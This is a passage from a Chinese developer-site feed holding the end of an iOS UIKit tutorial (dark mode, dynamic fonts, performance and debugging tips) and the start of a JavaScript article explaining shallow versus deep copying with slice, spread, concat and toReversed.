    <span class="hljs-keyword">if</span> (traitCollection.userInterfaceStyle == <span class="hljs-built_in">UIUserInterfaceStyleDark</span>) {

        <span class="hljs-keyword">return</span> [<span class="hljs-built_in">UIColor</span> whiteColor]; <span class="hljs-comment">// 暗黑模式</span>

    } <span class="hljs-keyword">else</span> {

        <span class="hljs-keyword">return</span> [<span class="hljs-built_in">UIColor</span> blackColor]; <span class="hljs-comment">// 浅色模式</span>

    }

}];

<span class="hljs-keyword">self</span>.view.backgroundColor = dynamicColor;

<span class="hljs-comment">// 监听模式变化</span>

- (<span class="hljs-type">void</span>)traitCollectionDidChange:(<span class="hljs-built_in">UITraitCollection</span> *)previousTraitCollection {

    [<span class="hljs-variable language_">super</span> traitCollectionDidChange:previousTraitCollection];

    <span class="hljs-keyword">if</span> ([<span class="hljs-keyword">self</span>.traitCollection hasDifferentColorAppearanceComparedToTraitCollection:previousTraitCollection]) {

        <span class="hljs-comment">// 更新颜色/图片</span>

        <span class="hljs-keyword">self</span>.label.textColor = dynamicColor;

    }

}

</code></pre>
<h4 data-id="heading-34">2. 动态字体（适配字体大小）</h4>
<pre><code class="hljs language-objc" lang="objc">
<span class="hljs-comment">// 动态字体（跟随系统字体大小）</span>

<span class="hljs-built_in">UIFont</span> *dynamicFont = [<span class="hljs-built_in">UIFont</span> preferredFontForTextStyle:<span class="hljs-built_in">UIFontTextStyleBody</span>];

<span class="hljs-keyword">self</span>.label.font = dynamicFont;

<span class="hljs-comment">// 监听字体大小变化</span>

[[<span class="hljs-built_in">NSNotificationCenter</span> defaultCenter] addObserver:<span class="hljs-keyword">self</span> selector:<span class="hljs-keyword">@selector</span>(fontSizeChanged:) name:<span class="hljs-built_in">UIContentSizeCategoryDidChangeNotification</span> object:<span class="hljs-literal">nil</span>];

</code></pre>
<h3 data-id="heading-35">七、性能优化</h3>
<h4 data-id="heading-36">1. 列表优化（UITableView/UICollectionView）</h4>
<ul>
<li>
<p>复用单元格（<code>dequeueReusableCellWithIdentifier:</code>）；</p>
</li>
<li>
<p>缓存单元格高度（避免重复计算）；</p>
</li>
<li>
<p>异步加载图片（SDWebImage 等）；</p>
</li>
<li>
<p>减少离屏渲染（避免圆角+阴影同时设置）；</p>
</li>
<li>
<p>禁用不必要的动画（<code>cell.selectionStyle = UITableViewCellSelectionStyleNone</code>）。</p>
</li>
</ul>
<h4 data-id="heading-37">2. 渲染优化</h4>
<ul>
<li>
<p>避免频繁调用 <code>setNeedsLayout</code>/<code>layoutIfNeeded</code>；</p>
</li>
<li>
<p>自定义绘制优先用 <code>CALayer</code> 而非 <code>drawRect:</code>；</p>
</li>
<li>
<p>开启光栅化（<code>layer.shouldRasterize = YES</code>，仅适合静态视图）；</p>
</li>
<li>
<p>减少透明视图（alpha &lt; 1 会触发离屏渲染）。</p>
</li>
</ul>
<h4 data-id="heading-38">3. 内存优化</h4>
<ul>
<li>
<p>避免循环引用（block 中用 <code>weakSelf</code>）；</p>
</li>
<li>
<p>图片压缩（<code>UIImageJPEGRepresentation</code>/<code>UIImagePNGRepresentation</code>）；</p>
</li>
<li>
<p>及时释放强引用（<code>dealloc</code> 中移除通知/定时器）；</p>
</li>
<li>
<p>懒加载控件（避免一次性创建大量视图）。</p>
</li>
</ul>
<h3 data-id="heading-39">八、调试工具</h3>
<h4 data-id="heading-40">1. Xcode 内置工具</h4>
<ul>
<li>
<p><strong>Debug View Hierarchy</strong>：可视化查看视图层级、约束、frame；</p>
</li>
<li>
<p><strong>Instruments</strong>：</p>
</li>
</ul>
<p>  - Core Animation：检测离屏渲染、帧率；</p>
<p>  - Time Profiler：检测卡顿；</p>
<p>  - Allocations：检测内存泄漏；</p>
<ul>
<li>
<p><strong>控制台日志</strong>：打印约束冲突、视图信息（<code>NSLog(@"frame: %@", NSStringFromCGRect(self.view.frame))</code>）。</p>
</li>
</ul>
<h4 data-id="heading-41">2. 约束冲突排查</h4>
<ul>
<li>
<p>控制台日志中定位「Unable to simultaneously satisfy constraints」；</p>
</li>
<li>
<p>降低非核心约束优先级（<code>constraint.priority = UILayoutPriorityDefaultHigh</code>）；</p>
</li>
<li>
<p>动态激活/禁用约束（<code>constraint.active = YES/NO</code>）。</p>
</li>
</ul>
<h3 data-id="heading-42">九、进阶特性</h3>
<h4 data-id="heading-43">1. 自定义控件</h4>
<p>继承 <code>UIView</code>/<code>UIControl</code> 实现自定义交互控件：</p>
<pre><code class="hljs language-objc" lang="objc">
<span class="hljs-class"><span class="hljs-keyword">@interface</span> <span class="hljs-title">CustomControl</span> : <span class="hljs-title">UIControl</span></span>

<span class="hljs-keyword">@property</span> (<span class="hljs-keyword">nonatomic</span>, <span class="hljs-keyword">assign</span>) <span class="hljs-built_in">CGFloat</span> progress;

<span class="hljs-keyword">@end</span>

<span class="hljs-class"><span class="hljs-keyword">@implementation</span> <span class="hljs-title">CustomControl</span></span>

- (<span class="hljs-type">void</span>)setProgress:(<span class="hljs-built_in">CGFloat</span>)progress {

    _progress = progress;

    [<span class="hljs-keyword">self</span> setNeedsDisplay]; <span class="hljs-comment">// 触发重绘</span>

}

- (<span class="hljs-type">void</span>)drawRect:(<span class="hljs-built_in">CGRect</span>)rect {

    <span class="hljs-comment">// 绘制进度条</span>

    <span class="hljs-built_in">CGRect</span> progressRect = <span class="hljs-built_in">CGRectMake</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, rect.size.width * <span class="hljs-keyword">self</span>.progress, rect.size.height);

    [[<span class="hljs-built_in">UIColor</span> blueColor] setFill];

    <span class="hljs-built_in">UIRectFill</span>(progressRect);

}

- (<span class="hljs-type">void</span>)touchesEnded:(<span class="hljs-built_in">NSSet</span>&lt;<span class="hljs-built_in">UITouch</span> *&gt; *)touches withEvent:(<span class="hljs-built_in">UIEvent</span> *)event {

    <span class="hljs-built_in">UITouch</span> *touch = [touches anyObject];

    <span class="hljs-built_in">CGPoint</span> point = [touch locationInView:<span class="hljs-keyword">self</span>];

    <span class="hljs-keyword">self</span>.progress = point.x / <span class="hljs-keyword">self</span>.bounds.size.width;

    [<span class="hljs-keyword">self</span> sendActionsForControlEvents:<span class="hljs-built_in">UIControlEventValueChanged</span>]; <span class="hljs-comment">// 触发值变化事件</span>

}

<span class="hljs-keyword">@end</span>

</code></pre>
<h4 data-id="heading-44">2. 文本排版（NSAttributedString）</h4>
<pre><code class="hljs language-objc" lang="objc">
<span class="hljs-built_in">NSMutableAttributedString</span> *attStr = [[<span class="hljs-built_in">NSMutableAttributedString</span> alloc] initWithString:<span class="hljs-string">@"富文本示例"</span>];

<span class="hljs-comment">// 设置字体</span>

[attStr addAttribute:<span class="hljs-built_in">NSFontAttributeName</span> value:[<span class="hljs-built_in">UIFont</span> boldSystemFontOfSize:<span class="hljs-number">18</span>] range:<span class="hljs-built_in">NSMakeRange</span>(<span class="hljs-number">0</span>, <span class="hljs-number">3</span>)];

<span class="hljs-comment">// 设置颜色</span>

[attStr addAttribute:<span class="hljs-built_in">NSForegroundColorAttributeName</span> value:[<span class="hljs-built_in">UIColor</span> redColor] range:<span class="hljs-built_in">NSMakeRange</span>(<span class="hljs-number">0</span>, <span class="hljs-number">3</span>)];

<span class="hljs-comment">// 设置下划线</span>

[attStr addAttribute:<span class="hljs-built_in">NSUnderlineStyleAttributeName</span> value:@(<span class="hljs-built_in">NSUnderlineStyleSingle</span>) range:<span class="hljs-built_in">NSMakeRange</span>(<span class="hljs-number">3</span>, <span class="hljs-number">2</span>)];

<span class="hljs-keyword">self</span>.label.attributedText = attStr;

</code></pre>
<h3 data-id="heading-45">十、最佳实践</h3>
<ol>
<li>
<p><strong>MVC 分层</strong>：控制器仅负责逻辑调度，视图仅负责展示，模型仅负责数据；</p>
</li>
<li>
<p><strong>控件封装</strong>：将重复的控件逻辑封装为分类/子类（如 <code>UIButton+Custom</code>）；</p>
</li>
<li>
<p><strong>兼容性处理</strong>：通过 <code>@available</code> 适配不同 iOS 版本：</p>
</li>
</ol>
<pre><code class="hljs language-objc" lang="objc">
   <span class="hljs-keyword">if</span> (@available(iOS <span class="hljs-number">13.0</span>, *)) {

       <span class="hljs-comment">// iOS 13+ 逻辑</span>

   } <span class="hljs-keyword">else</span> {

       <span class="hljs-comment">// 低版本逻辑</span>

   }

</code></pre>
<ol start="4">
<li>
<p><strong>避免生命周期陷阱</strong>：<code>viewDidLoad</code> 仅初始化，<code>viewWillAppear</code> 处理每次显示的逻辑；</p>
</li>
<li>
<p><strong>响应链优化</strong>：减少不必要的 <code>userInteractionEnabled = NO</code>，避免事件传递卡顿。</p>
</li>
</ol>
<h3 data-id="heading-46">总结</h3>
<p>UIKit 是 iOS 开发的「基石框架」，核心围绕「视图（UIView）- 控制器（UIViewController）- 事件（UIResponder）」展开，掌握「布局体系」「事件处理」「渲染优化」是关键。实际开发中，优先用 Masonry 简化 Auto Layout，结合 Size Classes/暗黑模式适配多场景，通过 Instruments 定位性能问题，可高效构建稳定、适配性强的 iOS 界面。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 “牵线木偶” 到 “独立个体”：JS 拷贝的爱恨情仇（浅拷贝 VS 深拷贝）]]></title>    <link>https://juejin.cn/post/7579800429376176178</link>    <guid>https://juejin.cn/post/7579800429376176178</guid>    <pubDate>2025-12-04T08:44:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579800429376176178" data-draft-id="7579544918076506147" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 “牵线木偶” 到 “独立个体”：JS 拷贝的爱恨情仇（浅拷贝 VS 深拷贝）"/> <meta itemprop="keywords" content="JavaScript,前端,面试"/> <meta itemprop="datePublished" content="2025-12-04T08:44:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="风止何安啊"/> <meta itemprop="url" content="https://juejin.cn/user/2517239724512420"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 “牵线木偶” 到 “独立个体”：JS 拷贝的爱恨情仇（浅拷贝 VS 深拷贝）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2517239724512420/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    风止何安啊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:44:16.000Z" title="Thu Dec 04 2025 08:44:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>你有没有过这种抓狂瞬间：明明新建了对象想单独修改，结果原对象跟着 <strong>“秒同步”</strong>？就像买了个连轴的 <strong>“牵线木偶”</strong>，动新的、老的也跟着晃！这事儿得怪 <strong>JS 的引用类型</strong> —— 对象、数组这类 “特殊选手” 存的不是具体数值，而是指向数据的 <strong>“内存地址”</strong>。想让新对象彻底 “自立门户” 不牵连原对象？<strong>拷贝</strong>，安排上！</p>
<h3 data-id="heading-1">一、先搞懂：为啥基础类型不用拷贝？</h3>
<p>举个例子：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> a = <span class="hljs-number">1</span>;
<span class="hljs-keyword">let</span> b = a;
</code></pre>
<p>a 和 b 存的是<strong>具体数值</strong>，改 a 不会影响 b—— 这叫 <strong>“值传递”</strong>。<strong>原理</strong>：基础类型存栈内存，<code>b = a</code>是复制 a 的具体数值到 b 的<strong>独立栈空间</strong>，改 a 只改自身内存，不影响 b。所以你怎么改变<code>a</code>都不会影响<code>b</code>。</p>
<p>但引用类型（比如对象）不一样：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> obj = { 
    <span class="hljs-attr">age</span>: <span class="hljs-number">18</span> 
};
<span class="hljs-keyword">let</span> obj2 = obj; <span class="hljs-comment">// obj2存的是obj的地址！</span>
obj.<span class="hljs-property">age</span> = <span class="hljs-number">20</span>; 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj2.<span class="hljs-property">age</span>); <span class="hljs-comment">// 也变成20了！</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbaec51087294aeabe223558b58ba5b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442656&amp;x-signature=rZBFrsSbCPtzyL6aObI1bm1a2wk%3D" alt="image.png" loading="lazy"/></p>
<p>这就像你和朋友<strong>共用</strong>一个网盘，你改了文件，朋友那边也同步变了 —— 这就是 <strong>“引用传递”</strong>。</p>
<h3 data-id="heading-2">二、浅拷贝：“表面独立，内核共享”</h3>
<p>浅拷贝是 <strong>“只拷贝第一层”</strong>：新对象的<strong>基本类型属性</strong>是独立的，但<strong>子对象 / 子数组</strong>还是共用地址 —— 相当于 “表面分了家，钱包还共用”。那么浅拷贝有哪些经典的例子呢？我们一个一个来看看：</p>
<h4 data-id="heading-3">1. 数组的浅拷贝：<code>slice(0)</code></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'c'</span>, <span class="hljs-string">'d'</span>, {<span class="hljs-attr">age</span>: <span class="hljs-number">18</span>}];
<span class="hljs-keyword">const</span> arr2 = arr.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>);
arr[<span class="hljs-number">4</span>].<span class="hljs-property">age</span> = <span class="hljs-number">20</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr2);
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/493961f8dfbe4106b7f36e7f19d1ae7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442656&amp;x-signature=CDhdUapa22XNyWJwIOlDVCRHDBo%3D" alt="image.png" loading="lazy"/></p>
<p><code>slice(0)</code>把数组第一层都复制了，但里面的<code>{age:18}</code>是对象，传的是地址 —— 改原数组里的子对象，新数组也跟着变！</p>
<p>看图更详细：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1cac6fea77641acae66f00344913eb0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442656&amp;x-signature=XPA%2BBJOLQAj8nC7MSaIwn%2Fj8IZQ%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-4">2. 数组的浅拷贝：扩展运算符<code>[...arr]</code></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> a = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, {<span class="hljs-attr">age</span>: <span class="hljs-number">18</span>}];
<span class="hljs-keyword">let</span> c = [...a];
a[<span class="hljs-number">2</span>].<span class="hljs-property">age</span> = <span class="hljs-number">19</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c);
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3b59a54ce974fdaa15c158acbc05732~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442656&amp;x-signature=7XHl85l9usn%2F7Stv2lqEoLRCUXU%3D" alt="image.png" loading="lazy"/></p>
<p>扩展运算符<code>[...arr]</code>看着像是给数组 “开了个全新副本”，用起来简洁又酷炫，新手第一眼都会觉得 “这肯定是完全独立了吧？”—— 但真相是：它依旧是<strong>浅拷贝</strong>！扩展运算符只把数组<strong>第一层的基础类型值</strong>复制了一份，可数组里嵌套的子对象<code>{ age: 18... }</code>，拷贝的依旧是内存地址 —— 就像给你换了个新书包，但书包里的文具盒还是和同桌共用的，他改了文具盒里的笔，你这边也会跟着变。</p>
<h4 data-id="heading-5">3. 数组的浅拷贝：<code>concat()</code></h4>
<p>我们先验证他是否创建了一个新对象：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> a = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, {<span class="hljs-attr">age</span>: <span class="hljs-number">18</span>}];
<span class="hljs-keyword">const</span> b = [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>];
<span class="hljs-keyword">const</span> c = a.<span class="hljs-title function_">concat</span>(b);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c, a);
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/842aaf6f06fd49939bfbd655d7dbb7ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442656&amp;x-signature=FSXs88%2Fa9TuXDdOAWKveRkWROyg%3D" alt="image.png" loading="lazy"/></p>
<p>很明显<code>c</code>为创建的新对象。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> a = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, { <span class="hljs-attr">age</span>: <span class="hljs-number">18</span> }]; 
<span class="hljs-keyword">const</span> d = a.<span class="hljs-title function_">concat</span>(); <span class="hljs-comment">// 或者 const d = [].concat(a);</span>
a[<span class="hljs-number">3</span>].<span class="hljs-property">age</span> = <span class="hljs-number">19</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(d); 
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58568944efa748b9bc4329eae30d8090~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442656&amp;x-signature=dWJ8LDkKY0qXYFFE0imIDZmQzKc%3D" alt="image.png" loading="lazy"/></p>
<p><code>concat()</code>做数组浅拷贝时，会复制原数组第一层<strong>基础类型元素</strong>到新数组（改原数组第一层基础值不影响新数组），但原数组里的<strong>嵌套对象 / 数组</strong>，只会复制其内存地址到新数组 —— 改原数组子对象属性，新数组会同步变，子对象<strong>仍是 “牵线木偶”</strong>。</p>
<h4 data-id="heading-6">4. 数组的 “假独立”：<code>toReversed()</code></h4>
<p>在看<code>toReversed()</code>之前，我们先看看为什么不用<code>reverse()</code></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-keyword">const</span> arr2 = arr.<span class="hljs-title function_">reverse</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr);
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7865773a84b343d091c2e8e1da662431~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442656&amp;x-signature=BpvsHWrsiRYYbVEW7NW0mq48u6k%3D" alt="image.png" loading="lazy"/></p>
<p>很明显，<code>reverse()</code>并没有创建一个新的对象，而是在原数组上直接修改。所以我们肯定不能用<code>reverse()</code>，于是有请--<code>toReversed()</code>登场！</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-keyword">const</span> arr2 = arr.<span class="hljs-title function_">toReversed</span>().<span class="hljs-title function_">reverse</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr2, arr);
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78603293f9514ce9b53ec8575dc016ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442656&amp;x-signature=9plqWIMsN5Psodt9DwYnbK7b%2FqQ%3D" alt="image.png" loading="lazy"/></p>
